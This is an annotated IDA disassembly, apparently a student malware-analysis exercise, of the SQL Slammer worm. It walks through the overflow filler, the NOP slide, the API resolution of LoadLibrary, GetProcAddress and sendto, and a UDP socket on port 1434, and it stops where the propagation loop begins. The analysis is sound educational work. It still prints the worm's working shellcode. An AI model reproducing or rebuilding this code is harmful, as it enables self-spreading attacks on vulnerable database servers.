<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - sqlslammer-sample.i64 (sqlslammer-sample) C:\Users\golden\Downloads\sqlslammer-sample.i64</title>
</head>
<body class="c41">
<span style="white-space: pre; font-family: Consolas,monospace;" class="c1 c41">
<span class="c45">seg000:0000000000000000 </span>;
<span class="c45">seg000:0000000000000000 </span>; +-------------------------------------------------------------------------+
<span class="c45">seg000:0000000000000000 </span>; |      This file was generated by The Interactive Disassembler (IDA)      |
<span class="c45">seg000:0000000000000000 </span>; |           Copyright (c) 2022 Hex-Rays, &lt;support@hex-rays.com&gt;           |
<span class="c45">seg000:0000000000000000 </span>; |                      License info: 48-3051-7114-0E                      |
<span class="c45">seg000:0000000000000000 </span>; |           LSU (Louisiana State University), Academic licenses           |
<span class="c45">seg000:0000000000000000 </span>; +-------------------------------------------------------------------------+
<span class="c45">seg000:0000000000000000 </span>;
<span class="c45">seg000:0000000000000000 </span>; Input SHA256 : 61D0096867F96613237F4E76E0D73C67EA81A21F1F0C0DA735B65D1D5562B3D2
<span class="c45">seg000:0000000000000000 </span>; Input MD5    : AB4234A07E53EDB78299A938C4300FC2
<span class="c45">seg000:0000000000000000 </span>; Input CRC32  : 16D72AA9
<span class="c45">seg000:0000000000000000
seg000:0000000000000000 </span><span class="c4">; ---------------------------------------------------------------------------
</span><span class="c45">seg000:0000000000000000 </span><span class="c21">; File Name   : C:\Users\golden\Downloads\sqlslammer-sample
</span><span class="c45">seg000:0000000000000000 </span><span class="c21">; Format      : Binary file
</span><span class="c45">seg000:0000000000000000 </span><span class="c21">; Base Address: 0000h Range: 0000h - 01B2h Loaded length: 01B2h
</span><span class="c45">seg000:0000000000000000
seg000:0000000000000000                 .</span><span class="c27">686p
</span><span class="c45">seg000:0000000000000000                 </span><span class="c27">.mmx
</span><span class="c45">seg000:0000000000000000                 </span><span class="c27">.model flat
</span><span class="c45">seg000:0000000000000000
seg000:0000000000000000 </span><span class="c4">; ===========================================================================
</span><span class="c45">seg000:0000000000000000
seg000:0000000000000000 </span><span class="c4">; Segment type: Pure code
</span><span class="c45">seg000:0000000000000000 </span><span class="c27">seg000          segment byte public &#039;CODE&#039; use64
</span><span class="c45">seg000:0000000000000000                 </span><span class="c27">assume cs:seg000
</span><span class="c45">seg000:0000000000000000                 </span><span class="c27">assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
</span><span class="c45">seg000:0000000000000000                 </span><span class="c5">add     </span><span class="c33">al</span><span class="c9">, </span><span class="c12">1
</span><span class="c45">seg000:0000000000000002                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax      </span><span class="c2">; Filler to generate the buffer overflow
</span><span class="c45">seg000:0000000000000004                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000006                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000008                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000000A                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000000C                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000000E                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000010                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000012                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000014                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000016                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000018                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000001A                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000001C                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000001E                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000020                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000022                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000024                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000026                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000028                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000002A                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000002C                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000002E                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000030                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000032                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000034                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000036                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000038                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000003A                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000003C                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000003E                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000040                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000042                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000044                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000046                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000048                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000004A                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000004C                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000004E                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000050                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000052                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000054                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000056                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:0000000000000058                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000005A                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax
</span><span class="c45">seg000:000000000000005C                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax      </span><span class="c2">; filler
</span><span class="c45">seg000:000000000000005E                 </span><span class="c5">add     </span><span class="c9">[</span><span class="c33">rcx</span><span class="c9">], </span><span class="c33">eax      </span><span class="c2">; End Filler
</span><span class="c45">seg000:0000000000000060                 </span><span class="c5">add     </span><span class="c33">esp</span><span class="c9">, </span><span class="c33">ebx
</span><span class="c45">seg000:0000000000000062                 </span><span class="c5">leave
</span><span class="c45">seg000:0000000000000063                 </span><span class="c5">mov     </span><span class="c33">al</span><span class="c9">, </span><span class="c12">42h </span><span class="c4">; &#039;B&#039;
</span><span class="c45">seg000:0000000000000065                 </span><span class="c5">jmp     </span><span class="c32">short </span><span class="c26">loc_75
</span><span class="c45">seg000:0000000000000065 </span><span class="c4">; ---------------------------------------------------------------------------
</span><span class="c47">seg000:0000000000000067                 </span><span class="c32">db    </span><span class="c31">1                 </span><span class="c2">; Trash
</span><span class="c47">seg000:0000000000000068                 </span><span class="c32">db    </span><span class="c31">1
</span><span class="c46">seg000:0000000000000069                 </span><span class="c32">db </span><span class="c31">5 </span><span class="c32">dup(</span><span class="c31">1</span><span class="c32">)</span><span class="c9">, </span><span class="c31">70h</span><span class="c9">, </span><span class="c31">0AEh
</span><span class="c46">seg000:0000000000000070                 </span><span class="c32">db </span><span class="c31">42h</span><span class="c9">, </span><span class="c31">1</span><span class="c9">, </span><span class="c31">70h</span><span class="c9">, </span><span class="c31">0AEh</span><span class="c9">, </span><span class="c31">42h </span><span class="c2">; Trash
</span><span class="c45">seg000:0000000000000075 </span><span class="c4">; ---------------------------------------------------------------------------
</span><span class="c45">seg000:0000000000000075
seg000:0000000000000075 </span><span class="c26">loc_75</span><span class="c9">:                                 </span><span class="c14">; CODE XREF: seg000:0000000000000065&#8593;j
</span><span class="c45">seg000:0000000000000075                 </span><span class="c5">nop                     </span><span class="c2">; NOP slide
</span><span class="c45">seg000:0000000000000076                 </span><span class="c5">nop
</span><span class="c45">seg000:0000000000000077                 </span><span class="c5">nop
</span><span class="c45">seg000:0000000000000078                 </span><span class="c5">nop
</span><span class="c45">seg000:0000000000000079                 </span><span class="c5">nop
</span><span class="c45">seg000:000000000000007A                 </span><span class="c5">nop
</span><span class="c45">seg000:000000000000007B                 </span><span class="c5">nop
</span><span class="c45">seg000:000000000000007C                 </span><span class="c5">nop                     </span><span class="c2">; End Slide | Start Worm Code
</span><span class="c45">seg000:000000000000007D                 </span><span class="c5">push    </span><span class="c12">42B0C9DCh       </span><span class="c2">; Overflow result | corrupted return address
</span><span class="c45">seg000:000000000000007D                                         </span><span class="c2">; ebp + 3
</span><span class="c45">seg000:0000000000000082                 </span><span class="c5">mov     </span><span class="c33">eax</span><span class="c9">, </span><span class="c12">1010101h
</span><span class="c45">seg000:0000000000000087                 </span><span class="c5">xor     </span><span class="c33">ecx</span><span class="c9">, </span><span class="c33">ecx        </span><span class="c2">; ecx = 0
</span><span class="c45">seg000:0000000000000089                 </span><span class="c5">mov     </span><span class="c33">cl</span><span class="c9">, </span><span class="c12">18h         </span><span class="c2">; count for loop
</span><span class="c45">seg000:000000000000008B
seg000:000000000000008B </span><span class="c26">loc_8B</span><span class="c9">:                                 </span><span class="c14">; CODE XREF: seg000:000000000000008C&#8595;j
</span><span class="c45">seg000:000000000000008B                 </span><span class="c5">push    </span><span class="c33">rax
</span><span class="c45">seg000:000000000000008C                 </span><span class="c5">loop    </span><span class="c26">loc_8B          </span><span class="c2">; push rax 24 times,
</span><span class="c45">seg000:000000000000008C                                         </span><span class="c2">; loop decrements ecx which
</span><span class="c45">seg000:000000000000008C                                         </span><span class="c2">; equals 00 18
</span><span class="c45">seg000:000000000000008C                                         </span><span class="c2">;
</span><span class="c45">seg000:000000000000008C                                         </span><span class="c2">; at this point he repairs the virus&#039;s buffer overflow by padding
</span><span class="c45">seg000:000000000000008C                                         </span><span class="c2">; the size of the virus
</span><span class="c45">seg000:000000000000008E                 </span><span class="c5">xor     </span><span class="c33">eax</span><span class="c9">, </span><span class="c12">5010101h   </span><span class="c2">; eax = 0400 0000
</span><span class="c45">seg000:0000000000000093                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; save the value of eax
</span><span class="c45">seg000:0000000000000094                 </span><span class="c5">mov     </span><span class="c33">ebp</span><span class="c9">, </span><span class="c33">esp        </span><span class="c2">; relocate the base pointer to
</span><span class="c45">seg000:0000000000000094                                         </span><span class="c2">; the current end of the stack
</span><span class="c45">seg000:0000000000000096                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 4
</span><span class="c45">seg000:0000000000000097                 </span><span class="c5">push    </span><span class="c12">6C6C642Eh       </span><span class="c2">; lld.  ebp - 8
</span><span class="c45">seg000:000000000000009C                 </span><span class="c5">push    </span><span class="c12">32336C65h       </span><span class="c2">; 23le   ebp - 12
</span><span class="c45">seg000:00000000000000A1                 </span><span class="c5">push    </span><span class="c12">6E72656Bh       </span><span class="c2">; nrek   ebp - 16
</span><span class="c45">seg000:00000000000000A1                                         </span><span class="c2">;
</span><span class="c45">seg000:00000000000000A1                                         </span><span class="c2">; &#039;kernel32.dll&#039;
</span><span class="c45">seg000:00000000000000A6                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 20
</span><span class="c45">seg000:00000000000000A7                 </span><span class="c5">push    </span><span class="c12">746E756Fh       </span><span class="c2">; tnuo   ebp - 24
</span><span class="c45">seg000:00000000000000AC                 </span><span class="c5">push    </span><span class="c12">436B6369h       </span><span class="c2">; Ckci    ebp - 28
</span><span class="c45">seg000:00000000000000B1                 </span><span class="c5">push    </span><span class="c12">54746547h       </span><span class="c2">; TteG   ebp - 32
</span><span class="c45">seg000:00000000000000B1                                         </span><span class="c2">;
</span><span class="c45">seg000:00000000000000B1                                         </span><span class="c2">; &#039;GetTickCount&#039;
</span><span class="c45">seg000:00000000000000B6                 </span><span class="c5">mov     </span><span class="c33">cx</span><span class="c9">, </span><span class="c12">6C6Ch       </span><span class="c2">; ll
</span><span class="c45">seg000:00000000000000BA                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 36
</span><span class="c45">seg000:00000000000000BB                 </span><span class="c5">push    </span><span class="c12">642E3233h       </span><span class="c2">; d.23   ebp - 40
</span><span class="c45">seg000:00000000000000C0                 </span><span class="c5">push    </span><span class="c12">5F327377h       </span><span class="c2">; _2sw    ebp - 44
</span><span class="c45">seg000:00000000000000C5                 </span><span class="c5">mov     </span><span class="c33">cx</span><span class="c9">, </span><span class="c12">7465h       </span><span class="c2">; te
</span><span class="c45">seg000:00000000000000C9                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 48
</span><span class="c45">seg000:00000000000000CA                 </span><span class="c5">push    </span><span class="c12">6B636F73h       </span><span class="c2">; kcos   ebp - 52
</span><span class="c45">seg000:00000000000000CF                 </span><span class="c5">mov     </span><span class="c33">cx</span><span class="c9">, </span><span class="c12">6F74h       </span><span class="c2">; ot
</span><span class="c45">seg000:00000000000000D3                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 56
</span><span class="c45">seg000:00000000000000D4                 </span><span class="c5">push    </span><span class="c12">646E6573h       </span><span class="c2">; dnes   ebp - 60
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">;
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; &#039;send to socket ws_23.dll&#039;
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">;
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; This segment is crucial to the code
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; because he refers back to these
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; saved strings later when
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; looking them up in the
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; ITA table
</span><span class="c45">seg000:00000000000000D4                                         </span><span class="c2">; //
</span><span class="c45">seg000:00000000000000D9                 </span><span class="c5">mov     </span><span class="c33">esi</span><span class="c9">, </span><span class="c12">42AE1018h  </span><span class="c2">; load library
</span><span class="c45">seg000:00000000000000DE                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">2Ch</span><span class="c9">]  </span><span class="c2">; load address ebp - 44
</span><span class="c45">seg000:00000000000000DE                                         </span><span class="c2">; &#039;ws2_23.dll&#039;
</span><span class="c45">seg000:00000000000000E1                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; push eax so its a argument for
</span><span class="c45">seg000:00000000000000E1                                         </span><span class="c2">; load library
</span><span class="c45">seg000:00000000000000E2                 </span><span class="c5">call    </span><span class="c32">qword ptr </span><span class="c9">[</span><span class="c33">rsi</span><span class="c9">] </span><span class="c2">; load libarary for file
</span><span class="c45">seg000:00000000000000E2                                         </span><span class="c2">;  ws2_23.dll
</span><span class="c45">seg000:00000000000000E4                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; save the value returned by loadlibrary
</span><span class="c45">seg000:00000000000000E4                                         </span><span class="c2">; ebp - 64
</span><span class="c45">seg000:00000000000000E4                                         </span><span class="c2">; //
</span><span class="c45">seg000:00000000000000E5                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">20h</span><span class="c9">]  </span><span class="c2">; load address from ebp - 32
</span><span class="c45">seg000:00000000000000E8                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; add to stack to be an argument
</span><span class="c45">seg000:00000000000000E8                                         </span><span class="c2">; load &#039;GetTickCount&#039;
</span><span class="c45">seg000:00000000000000E9                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">10h</span><span class="c9">]  </span><span class="c2">; load address from ebp - 16
</span><span class="c45">seg000:00000000000000EC                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; add to stack to be an argument
</span><span class="c45">seg000:00000000000000EC                                         </span><span class="c2">; load &#039;kernel32.dll&#039;
</span><span class="c45">seg000:00000000000000ED                 </span><span class="c5">call    </span><span class="c32">qword ptr </span><span class="c9">[</span><span class="c33">rsi</span><span class="c9">] </span><span class="c2">; call load library again
</span><span class="c45">seg000:00000000000000EF                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; save the address of &#039;kernel32.dll&#039;
</span><span class="c45">seg000:00000000000000EF                                         </span><span class="c2">; for later use in GetProcAddress
</span><span class="c45">seg000:00000000000000EF                                         </span><span class="c2">; //
</span><span class="c45">seg000:00000000000000F0                 </span><span class="c5">mov     </span><span class="c33">esi</span><span class="c9">, </span><span class="c12">42AE1010h  </span><span class="c2">; get proc address
</span><span class="c45">seg000:00000000000000F0                                         </span><span class="c2">; //Switches what function is
</span><span class="c45">seg000:00000000000000F0                                         </span><span class="c2">; called by esi
</span><span class="c45">seg000:00000000000000F5                 </span><span class="c5">mov     </span><span class="c33">ebx</span><span class="c9">, [</span><span class="c33">rsi</span><span class="c9">]      </span><span class="c2">; ebx = address for GetProcAddress
</span><span class="c45">seg000:00000000000000F7                 </span><span class="c5">mov     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbx</span><span class="c9">]      </span><span class="c2">; move first 4 bytes into eax
</span><span class="c45">seg000:00000000000000F9                 </span><span class="c5">cmp     </span><span class="c33">eax</span><span class="c9">, </span><span class="c12">51EC8B55h  </span><span class="c2">; Does the signature match?
</span><span class="c45">seg000:00000000000000FE                 </span><span class="c5">jz      </span><span class="c32">short </span><span class="c26">loc_105   </span><span class="c2">; We have GetProcAddress!
</span><span class="c45">seg000:00000000000000FE                                         </span><span class="c2">; Jump ahead
</span><span class="c45">seg000:0000000000000100                 </span><span class="c5">mov     </span><span class="c33">esi</span><span class="c9">, </span><span class="c12">42AE101Ch  </span><span class="c2">; A Secondary value for getProcaddress
</span><span class="c45">seg000:0000000000000100                                         </span><span class="c2">; depending on version #
</span><span class="c45">seg000:0000000000000105
seg000:0000000000000105 </span><span class="c26">loc_105</span><span class="c9">:                                </span><span class="c14">; CODE XREF: seg000:00000000000000FE&#8593;j
</span><span class="c45">seg000:0000000000000105                 </span><span class="c5">call    </span><span class="c32">qword ptr </span><span class="c9">[</span><span class="c33">rsi</span><span class="c9">] </span><span class="c2">; Call GetProcAddress using the
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; kernel32 address and GetTickCount
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; as arguments
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">;
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; //aka search the kernel file
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; a find me the REAL address of
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; GetTickCount and return it in
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; eax
</span><span class="c45">seg000:0000000000000105                                         </span><span class="c2">; //
</span><span class="c45">seg000:0000000000000107                 </span><span class="c5">call    </span><span class="c33">rax             </span><span class="c2">; Call GetTickCount
</span><span class="c45">seg000:0000000000000109                 </span><span class="c5">xor     </span><span class="c33">ecx</span><span class="c9">, </span><span class="c33">ecx        </span><span class="c2">; ecx = 0
</span><span class="c45">seg000:000000000000010B                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 68
</span><span class="c45">seg000:000000000000010C                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; he pushes 0 onto the stack twice? ebp - 72
</span><span class="c45">seg000:000000000000010D                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; saved value return from
</span><span class="c45">seg000:000000000000010D                                         </span><span class="c2">; GetTickCount
</span><span class="c45">seg000:000000000000010D                                         </span><span class="c2">; aka the milliseconds since the
</span><span class="c45">seg000:000000000000010D                                         </span><span class="c2">; computer was booted
</span><span class="c45">seg000:000000000000010D                                         </span><span class="c2">; ebp - 76
</span><span class="c45">seg000:000000000000010E                 </span><span class="c5">xor     </span><span class="c33">ecx</span><span class="c9">, </span><span class="c12">9B040103h  </span><span class="c2">; 0 xor 9B040103 =
</span><span class="c45">seg000:000000000000010E                                         </span><span class="c2">; 9B040103
</span><span class="c45">seg000:000000000000010E                                         </span><span class="c2">; unchanged
</span><span class="c45">seg000:0000000000000114                 </span><span class="c5">xor     </span><span class="c33">ecx</span><span class="c9">, </span><span class="c12">1010101h   </span><span class="c2">; 9B0401 xor 1010101 = 9A050002 destport family
</span><span class="c45">seg000:0000000000000114                                         </span><span class="c2">; 59Ah = 1434 port #
</span><span class="c45">seg000:0000000000000114                                         </span><span class="c2">; sin_family = 2 for AF_INET
</span><span class="c45">seg000:000000000000011A                 </span><span class="c5">push    </span><span class="c33">rcx             </span><span class="c2">; ebp - 80 | saved port #
</span><span class="c45">seg000:000000000000011A                                         </span><span class="c2">;
</span><span class="c45">seg000:000000000000011A                                         </span><span class="c2">; beginning of sockaddress_
</span><span class="c45">seg000:000000000000011B                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">34h</span><span class="c9">]  </span><span class="c2">; load address ebp - 52
</span><span class="c45">seg000:000000000000011B                                         </span><span class="c2">; &#039;socket&#039; as an argument
</span><span class="c45">seg000:000000000000011E                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; added to stack
</span><span class="c45">seg000:000000000000011F                 </span><span class="c5">mov     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">40h</span><span class="c9">]  </span><span class="c2">; load address ebp - 64
</span><span class="c45">seg000:000000000000011F                                         </span><span class="c2">; address of &#039;ws2_32.dll&#039;
</span><span class="c45">seg000:0000000000000122                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; added to stack
</span><span class="c45">seg000:0000000000000123                 </span><span class="c5">call    </span><span class="c32">qword ptr </span><span class="c9">[</span><span class="c33">rsi</span><span class="c9">] </span><span class="c2">; call getprocaddress looking for socket
</span><span class="c45">seg000:0000000000000123                                         </span><span class="c2">; in the ws2_32.dll file
</span><span class="c45">seg000:0000000000000123                                         </span><span class="c2">; and stores its address in eax
</span><span class="c45">seg000:0000000000000125                 </span><span class="c5">push    </span><span class="c12">11h             </span><span class="c2">; protocol variable
</span><span class="c45">seg000:0000000000000127                 </span><span class="c5">push    </span><span class="c12">2               </span><span class="c2">; type
</span><span class="c45">seg000:0000000000000129                 </span><span class="c5">push    </span><span class="c12">2               </span><span class="c2">; domain
</span><span class="c45">seg000:0000000000000129                                         </span><span class="c2">;
</span><span class="c45">seg000:0000000000000129                                         </span><span class="c2">; function arguments for the socket call
</span><span class="c45">seg000:000000000000012B                 </span><span class="c5">call    </span><span class="c33">rax             </span><span class="c2">; call socket using the last three
</span><span class="c45">seg000:000000000000012B                                         </span><span class="c2">; pushes as arguments
</span><span class="c45">seg000:000000000000012D                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; save the file descriptor returned by socket
</span><span class="c45">seg000:000000000000012D                                         </span><span class="c2">; ebp - 84
</span><span class="c45">seg000:000000000000012E                 </span><span class="c5">lea     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">3Ch</span><span class="c9">]  </span><span class="c2">; load ebp - 60
</span><span class="c45">seg000:000000000000012E                                         </span><span class="c2">; //beginning of the send to
</span><span class="c45">seg000:000000000000012E                                         </span><span class="c2">; command
</span><span class="c45">seg000:0000000000000131                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; // used as an argument for
</span><span class="c45">seg000:0000000000000131                                         </span><span class="c2">; GetProcAddress
</span><span class="c45">seg000:0000000000000132                 </span><span class="c5">mov     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">40h</span><span class="c9">]  </span><span class="c2">; load ebp - 64
</span><span class="c45">seg000:0000000000000132                                         </span><span class="c2">; //grab the REAL address of
</span><span class="c45">seg000:0000000000000132                                         </span><span class="c2">; ws2_32.dll
</span><span class="c45">seg000:0000000000000135                 </span><span class="c5">push    </span><span class="c33">rax             </span><span class="c2">; //use as an argument for
</span><span class="c45">seg000:0000000000000135                                         </span><span class="c2">; GetProcAddress
</span><span class="c45">seg000:0000000000000136                 </span><span class="c5">call    </span><span class="c32">qword ptr </span><span class="c9">[</span><span class="c33">rsi</span><span class="c9">] </span><span class="c2">; Call GetProcAddress again
</span><span class="c45">seg000:0000000000000138                 </span><span class="c5">mov     </span><span class="c33">esi</span><span class="c9">, </span><span class="c33">eax        </span><span class="c2">; stores the address of SendTo
</span><span class="c45">seg000:0000000000000138                                         </span><span class="c2">; to the esi register for
</span><span class="c45">seg000:0000000000000138                                         </span><span class="c2">; future function calls
</span><span class="c45">seg000:000000000000013A                 </span><span class="c5">or      </span><span class="c33">ebx</span><span class="c9">, </span><span class="c33">ebx        </span><span class="c2">; ebx = 77f8313c, old value or&#039;d with
</span><span class="c45">seg000:000000000000013A                                         </span><span class="c2">; itself??
</span><span class="c45">seg000:000000000000013C                 </span><span class="c5">xor     </span><span class="c33">ebx</span><span class="c9">, </span><span class="c12">0FFD9613Ch </span><span class="c2">; xor = 0x88215000
</span><span class="c45">seg000:0000000000000142
seg000:0000000000000142 </span><span class="c26">loc_142</span><span class="c9">:                                </span><span class="c14">; CODE XREF: seg000:0000000000000176&#8595;j
</span><span class="c45">seg000:0000000000000142                 </span><span class="c5">mov     </span><span class="c33">eax</span><span class="c9">, [</span><span class="c33">rbp</span><span class="c9">-</span><span class="c12">4Ch</span><span class="c9">]  </span><span class="c2">; beginning of propogation loop
</span><span class="c45">seg000:0000000000000142                                         </span><span class="c2">; grab the milliseconds value from GetTickCount
</span><span class="c45">seg000:0000000000000142                                         </span><span class="c2">; This will act as a seed for the
</span><span class="c45">seg000:0000000000000142                                         </span><span class="c2">; random number generator
